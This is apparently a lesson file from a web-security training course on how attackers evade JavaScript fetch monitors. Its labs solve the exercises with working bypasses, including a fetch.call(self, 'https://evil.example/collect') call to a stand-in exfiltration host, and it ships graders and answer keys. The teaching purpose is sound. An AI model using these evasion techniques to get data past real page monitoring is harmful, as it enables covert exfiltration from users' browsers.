const ORDER_SNIPPET = `// Script 1 (loaded first — attacker-controlled or compromised)
var realFetch = fetch;
self.fetch = function (url, options) {
  console.log("[hostile] wrapping fetch to", url);
  return realFetch(url, options);
};

// Script 2 (loaded second — your security monitor)
var capturedFetch = fetch;
self.fetch = function (url, options) {
  console.log("[monitor] observed fetch to", url);
  return capturedFetch(url, options);
};
`;
const ORDER_TEST = `(function () { fetch('/api/ok'); __report({}); })();`;

const CACHE_SKELETON = `// Cache a reference to fetch RIGHT NOW, into a variable named stolenFetchRef,
// before anything else has a chance to monitor it. A monitor will install itself
// AFTER this code runs and block window.fetch entirely — your cached reference
// should still work regardless.
`;
const CACHE_TEST = `(async function () {
  self.fetch = function (url, options) {
    __securityAlert('high', 'Blocked fetch to ' + url, 'late-monitor');
    return Promise.reject(new Error('blocked by late-monitor'));
  };
  var results = {};
  try {
    await stolenFetchRef('/api/ok');
    results.bypassWorked = true;
  } catch (e) {
    results.bypassWorked = false;
  }
  __report(results);
})();
`;

const RECEIVER_SETUP = `var originalFetch = fetch;
self.fetch = function (url, options) {
  if (this === undefined) {
    if (String(url).indexOf('evil') !== -1) {
      console.log('[monitor] blocked:', url);
      return Promise.reject(new Error('blocked by monitor'));
    }
  } else {
    console.log('[monitor] unrecognized call shape, skipping check');
  }
  return originalFetch.call(this, url, options);
};
`;
const RECEIVER_SKELETON = `// The monitor above only checks the URL when fetch is called the "normal" way
// (a bare call, where \`this\` is undefined in strict mode). Call fetch with the
// SAME url ("https://evil.example/collect") but with an explicit receiver, so
// the check gets skipped entirely.
`;
const RECEIVER_TEST = `(function () {
  var reached = __mockFetchCalls.some(function (c) { return c.url && String(c.url).indexOf('evil.example') !== -1; });
  __report({ reached: reached });
})();
`;

const EXAMPLE_CODE = `var originalLog = console.log;

// A "monitor" installs first...
console.log = function () {
  originalLog.call(console, '[monitored]', Array.prototype.slice.call(arguments).join(' '));
};

// ...but this code already had its OWN reference to the original, captured
// before the monitor ever ran.
var earlyReference = originalLog;
earlyReference("This bypasses the monitor entirely");
console.log("This goes through the monitor");
`;

/** @type {import('../../game/lessonSchema.js').LessonContent} */
export default {
  id: 'instrumentation-evasion',
  moduleId: 'runtime-security-instrumentation',
  title: 'How Instrumentation Gets Evaded',
  estimatedMinutes: 30,
  difficulty: 'advanced',
  prerequisites: ['wrapping-fetch-safely'],
  relatedMissionIds: ['the-false-positive'],
  skillTags: ['runtimeInstrumentation', 'threatModeling'],

  whyItMatters: {
    development: 'Understanding how your own defensive code can be defeated is the only way to know what it actually guarantees versus what it merely happens to catch today.',
    security: 'None of this is theoretical — reference-capture races, receiver manipulation, and alternate channels are exactly how real client-side security controls get bypassed in practice, not exotic edge cases.',
    sourceDefense: '"How would an attacker bypass this?" is close to a guaranteed interview question for this role, and the honest answer is never "they can\'t" — it\'s a precise account of what your control actually covers and where its edges are.',
  },

  mentalModel: {
    coreIdea: 'Every evasion technique in this lesson reduces to the same fact: instrumentation written in JavaScript is just more JavaScript, sharing the same realm, the same privileges, and the same lack of built-in execution-order guarantees as anything it\'s trying to watch. Assuming you\'ll always run first, always get called the "normal" way, or that a captured reference stays trustworthy forever means relying on something the browser never actually promised.',
    explanation: 'Almost every runtime-instrumentation evasion technique reduces to one fact: instrumentation implemented in JavaScript is itself just more JavaScript, running in the same realm, with the same privileges, as anything it\'s trying to observe. There is no OS-level or browser-enforced guarantee about EXECUTION ORDER between scripts sharing a page beyond whatever the page\'s own loading sequence establishes — so "I captured a pristine reference" is only meaningful if you captured it before anything hostile had a chance to run, and nothing about the browser enforces that ordering FOR you. Similarly, "this function was called normally" is a claim about the call site\'s specific mechanics (receiver, arguments) — mechanics fully controllable by whoever is doing the calling.',
    distinctions: [
      { label: 'ECMAScript spec', text: 'That a bare function call (`fetch(url)`, no object before the dot) has `this === undefined` inside a strict-mode function — rather than defaulting to the global object — is precise, specified ECMAScript behavior, and it\'s exactly the mechanic the receiver-bypass lab exploits.' },
      { label: 'Simplified model', text: '"Capturing a pristine reference protects it" is only ever true relative to a specific point in time — it protects YOUR code\'s ability to reach the real implementation from then on, but does nothing for the shared global name, and is worthless if captured after hostile code already ran.' },
      { label: 'Browser-provided', text: 'None of the evasion techniques in this lesson defeat an actual BROWSER-enforced boundary (like cross-origin realm isolation, covered in an earlier lesson) — they defeat JAVASCRIPT-level defenses implemented as ordinary same-realm code. This is precisely why genuinely hostile-code-resistant protection has to rely on real realm separation, not reference games, wherever that\'s an option.' },
    ],
    snippet: `// Harvesting an untampered reference from a fresh, same-origin iframe — even if
// the MAIN page's own window.fetch has already been monkey-patched by something
// that ran earlier, a brand-new iframe gets its own realm with its own, still-
// pristine copy of every built-in.
var frame = document.createElement('iframe');
frame.style.display = 'none';
document.body.appendChild(frame);
var cleanFetch = frame.contentWindow.fetch; // untouched, regardless of main-page state
document.body.removeChild(frame); // the reference survives even after the iframe is gone`,
  },

  nuance: 'The clean-realm technique in the snippet above works because each realm — each window, including a freshly created iframe\'s — gets its own, completely separate set of built-in objects and prototypes; patching `window.fetch` or `Array.prototype.push` in the main page never touches the corresponding objects in a different realm, because they were never the same object to begin with, only equivalent ones. This is also its limit: it only helps against tampering that already happened in the MAIN page\'s realm. If the environment creating the clean iframe is itself compromised before this code runs — if `document.createElement` or the DOM APIs used to build the iframe are no longer trustworthy — the technique doesn\'t help, because it depends on being able to reach a genuinely untouched realm through APIs that are themselves still pristine.',

  securityAngle: 'Put the three lab techniques together and you get a realistic picture of why "we have a fetch monitor" is a much weaker claim than it sounds: a compromised third-party script that loads early can win the reference-capture race before any monitor installs, can call the wrapped fetch through `.call()`/`.apply()` with an explicit receiver to dodge a naive bare-call check, and can use `sendBeacon` or an image beacon instead of fetch entirely to sidestep a fetch-only monitor altogether (the exfiltration-channel problem from an earlier lesson). None of these individually require anything exotic — they\'re all standard, well-documented JavaScript behavior, combined deliberately. This is exactly why a security team\'s honest answer to "can this be bypassed" is never a flat no: it\'s a specific list of what the control actually covers, and matching that list against what a determined script could still do is the actual work of evaluating whether a given piece of instrumentation is worth deploying.',

  runtimeSecurityAngle: 'Given that reference-capture timing is a race and receiver-based checks are trivially steerable, realistic defenses layer several things rather than relying on any single trick. Being the literal first script the page loads — a synchronous script tag placed before every other script, including third-party tags — wins the reference-capture race deterministically rather than probabilistically; that\'s a deployment/ordering decision, not a JavaScript technique. Checking calling convention (receiver, argument shape) can catch unsophisticated bypasses cheaply, but, as the receiver-bypass lab showed, should never be the ONLY check, since it\'s checking incidental call-site mechanics rather than what the call actually does. The more durable signal is behavioral: what URL is this request actually going to, what data does it actually contain, does this pattern match known-legitimate traffic — that question is much harder for an attacker to dodge than "was this call shaped exactly the way the monitor expected."',

  keyTakeaways: [
    'Instrumentation written in JavaScript shares the same realm and privileges as anything it\'s watching — there is no built-in guarantee it runs, or captures references, before untrusted code does.',
    'A reference captured after hostile code has already run is not pristine, no matter how confident the capturing code is — reference capture is a race, not a guarantee.',
    'A separate realm (a fresh same-origin iframe) has its own genuinely distinct built-ins, untouched by whatever the main page\'s realm has already had patched — that\'s what makes the clean-realm technique work, and also its limit.',
    'A check based on calling convention (receiver, argument shape) is checking incidental call-site mechanics the caller fully controls — fn.call(explicitReceiver, ...) defeats a bare-call-only check trivially.',
    'None of these techniques defeat an actual browser-enforced boundary like realm isolation — they defeat same-realm JavaScript defenses, which is why the honest answer to "can this be bypassed" is a specific list of coverage, never a flat no.',
  ],

  example: {
    runner: 'worker',
    code: EXAMPLE_CODE,
    predictPrompt: 'A monitor wraps console.log. Predict whether the "early reference" call actually goes through the monitor or bypasses it, and why.',
  },
  panels: ['trace'],

  labs: [
    {
      id: 'predict-reference-poisoning',
      title: 'Predict: does execution order poison the capture?',
      type: 'predict',
      instructions: 'Two scripts run in this exact order. Read them, then predict whether the second script\'s "captured" reference is actually the real native fetch.',
      runner: 'worker',
      submissionMode: 'answer',
      sourceCode: ORDER_SNIPPET,
      initialCode: '',
      testScript: `${ORDER_SNIPPET}\n${ORDER_TEST}`,
      answerSchema: [
        { id: 'pristine', prompt: 'Is capturedFetch (inside "your" monitor) the real, untouched native fetch?', type: 'boolean' },
        { id: 'why', prompt: 'Why?', type: 'text' },
      ],
      validate(answers) {
        const correct = answers.pristine === 'false';
        const why = (answers.why ?? '').toLowerCase();
        const explained = ['first', 'already', 'order', 'ran before', 'earlier'].some((k) => why.includes(k));
        const score = (correct ? 0.6 : 0) + (explained ? 0.4 : 0);
        return { passed: correct && explained, score: { correctness: score, security: score }, feedback: [] };
      },
      hints: [
        'By the time "your" script runs `var capturedFetch = fetch;`, has anything already changed what the name `fetch` points to?',
        'The hostile script ran FIRST and already reassigned `self.fetch` to its own wrapper — "your" script captures whatever `fetch` currently is at that moment, which is already the hostile version, not the native one.',
      ],
      solution: 'No — `capturedFetch` is the hostile script\'s wrapper, not the real native fetch, because the hostile script ran first and already replaced the global before the monitor script ever executed.',
      explanation: 'This is the entire reason "capture pristine references as early as possible" matters as a specific, urgent instruction rather than a nice-to-have: a reference captured after untrusted code has already run is not pristine at all, no matter how confidently the capturing code believes it is.',
    },
    {
      id: 'bypass-via-early-cache',
      title: 'Break it: use a cached reference to bypass a later monitor',
      type: 'break',
      instructions: 'Cache fetch before anything else runs. A monitor will install itself afterward and block fetch entirely — but your cached reference should still work.',
      runner: 'worker',
      submissionMode: 'code',
      initialCode: CACHE_SKELETON,
      testScript: CACHE_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.bypassWorked;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'The cached reference bypassed the later monitor.' : 'The cached reference did not work — was it captured before the monitor installed?'] };
      },
      hints: [
        'This only requires one line: `var stolenFetchRef = fetch;` — placed before anything else has a chance to change what `fetch` refers to.',
        'The variable name matters here (the test script looks for `stolenFetchRef` specifically) — but the concept is what matters: whoever captures a reference FIRST controls whether it\'s trustworthy.',
      ],
      solution: 'var stolenFetchRef = fetch;',
      explanation: 'This is the mirror image of the previous lab, from the other side: whoever gets to run first and cache a reference "wins," regardless of which side (defender or attacker) they\'re on. It\'s why real instrumentation has to be injected as early as technically possible — ideally before any other page script has a chance to execute at all.',
    },
    {
      id: 'bypass-via-receiver',
      title: 'Break it: bypass a receiver-dependent check',
      type: 'break',
      instructions: 'The monitor below only checks the URL when fetch is called as a plain, bare call. Get "https://evil.example/collect" through anyway.',
      runner: 'worker',
      submissionMode: 'code',
      setupScript: RECEIVER_SETUP,
      initialCode: RECEIVER_SKELETON,
      testScript: RECEIVER_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.reached;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'The request reached the destination, bypassing the check.' : 'The request was still blocked (or never sent).'] };
      },
      hints: [
        'In strict mode, a plain call like `fetch(url)` has `this === undefined` inside the function — that\'s specifically the case the monitor checks for.',
        'Calling through `.call()`/`.apply()` with ANY explicit receiver (even `{}` or `self`) makes `this` something other than `undefined`, skipping the check entirely: `fetch.call(self, "https://evil.example/collect")`.',
      ],
      solution: `fetch.call(self, 'https://evil.example/collect');`,
      explanation: 'A receiver-dependent check is a check on HOW a function was called, not WHAT it was called with — and the caller fully controls both. This is a specific instance of a general rule: any security decision based on incidental call-site mechanics rather than the actual data/behavior is trivially steerable by whoever controls the call site.',
    },
  ],

  knowledgeCheck: [
    { id: 'kc-timing', question: 'Why is "capture native references as early as possible" not a complete solution on its own?', modelAnswer: 'It only protects reference capture from that moment forward — if any untrusted code (even accidentally, e.g. another legitimate script) runs before the capture, the "pristine" reference is already compromised. There\'s no browser-level guarantee of script execution order beyond what the page\'s own loading sequence establishes, so this is fundamentally a race, not a guarantee — real protection against a genuinely first-loaded hostile script requires injecting instrumentation even earlier than page script execution, e.g. via mechanisms outside page JavaScript entirely.', skillTag: 'runtimeInstrumentation' },
    { id: 'kc-clean-realm', question: 'A "clean iframe realm" technique creates a fresh iframe purely to harvest untampered native references. Does this retroactively fix an already-tampered main-page global?', modelAnswer: 'No. It gives you a pristine COPY of the native function from a separate, untouched realm, which you can then use INSTEAD of the (possibly tampered) main-page global going forward — but it does not repair or replace what the main page\'s own global currently points to for any OTHER code still calling it by name. It\'s a way to get a trustworthy reference for your own use, not a cure for the page\'s shared global state.', skillTag: 'runtimeInstrumentation' },
  ],

  interviewQuestions: [
    'Why does the order in which scripts execute matter so much for the trustworthiness of a "captured native reference"?',
    'Describe a way a naive security check based on the calling convention (arguments, receiver) can be bypassed, with a concrete example.',
    'Does any of this evasion defeat an actual browser-enforced security boundary? Why or why not?',
  ],
};
